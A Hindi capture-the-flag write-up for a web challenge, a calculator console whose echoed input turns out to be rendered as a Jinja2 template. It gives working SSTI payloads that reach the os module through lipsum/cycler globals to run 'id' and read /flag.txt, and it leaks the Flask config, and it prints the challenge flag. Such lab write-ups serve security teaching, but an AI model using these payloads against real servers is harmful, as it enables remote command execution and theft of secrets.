## 📌 कार्य

http://159.194.244.226:8082/ — "CLEARLINE - Expression Console"। एक ही इनपुट फ़ील्ड, जो एक सख़्त ग्रामर के अनुसार अंकगणित की गणना करता है: संख्याएँ, `+ - * / // % **`, कोष्ठक, यूनरी चिह्न; घात 64 तक सीमित है, मध्यवर्ती मान 2**4096 से नीचे रहते हैं, और इनपुट 512 वर्णों तक सीमित है। कैलकुलेटर स्वयं ईमानदारी से बनाया गया है: नाम, कॉल, एट्रिब्यूट और स्ट्रिंग AST स्तर पर काट दिए जाते हैं, और लोकल CPython के विरुद्ध 700 एक्सप्रेशन पर रैंडम डिफ़-फ़ज़िंग में एक भी विसंगति नहीं मिली। कैलकुलेटर को तोड़ना बेकार है।

## 🏁 समाधान

छेद कैलकुलेटर में नहीं, बल्कि echo में निकला। दर्ज किया गया एक्सप्रेशन वापस पेज के रिज़ल्ट पैनल में छापा जाता है, और यह कॉपी सर्वर पर Jinja2 टेम्पलेट के रूप में रेंडर होती है। फ़ैसला ("यह एक संख्यात्मक एक्सप्रेशन नहीं है") बिलकुल मायने नहीं रखता, रेंडर वैसे भी हो जाता है:

```bash
curl 'http://159.194.244.226:8082/?expr={{7*7}}'
# Input लाइन में: 49
```

आगे से यह क्लासिक SSTI है। Jinja के बिल्ट-इन ग्लोबल्स `lipsum`/`cycler` और उनके `__globals__` के ज़रिए os मॉड्यूल तक पहुँच मिलती है, और यही पहले से कमांड एक्ज़ीक्यूशन है:

```
?expr={{lipsum.__globals__['os'].popen('id').read()}}
    -> uid=1000(ctf) gid=1000(ctf) groups=1000(ctf),0(root)
```

कंटेनर में फ़्लैग /flag.txt में पड़ा है (43 बाइट, सभी के लिए पठनीय):

```
?expr={{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}
    -> kubstu{cl34rl1n3_t3mpl4t3_1nj3ct_983a0807}
```

साथ ही `{{config}}` भी लीक हो गया — पूरा Flask कॉन्फ़िग SECRET_KEY समेत, यानी सिर्फ़ रेंडर ही छेददार नहीं था। फ़्लैग को एक बार फिर `cycler.__init__.__globals__.os` श्रृंखला के ज़रिए पढ़ा गया — मान वही है।
